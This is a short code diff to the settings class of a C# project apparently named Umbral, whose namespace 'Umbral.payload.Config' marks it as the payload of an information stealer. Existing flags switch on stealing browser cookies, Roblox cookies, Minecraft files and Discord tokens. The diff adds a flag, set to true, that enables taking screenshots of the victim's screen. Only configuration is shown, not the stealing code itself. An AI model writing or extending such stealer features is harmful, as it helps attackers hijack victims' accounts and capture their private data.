@@ -27,6 +27,8 @@ namespace Umbral.payload.Config
 
         internal static readonly bool StealMinecraftFiles;
 
+        internal static readonly bool TakeScreenshot;
+
         internal static readonly string Mutex;
 
         static Settings()
@@ -45,6 +47,7 @@ namespace Umbral.payload.Config
             var stealRobloxCookies = true;
             var stealMinecraftFiles = true;
             var stealDiscordTokens = true;
+            var takeScreenshot = true;
 
             //--------------------------------------
 
@@ -62,6 +65,7 @@ namespace Umbral.payload.Config
             StealCookies = stealCookies;
             StealRobloxCookies = stealRobloxCookies;
             StealMinecraftFiles = stealMinecraftFiles;
+            TakeScreenshot = takeScreenshot;
             Mutex = mutex;
         }
 
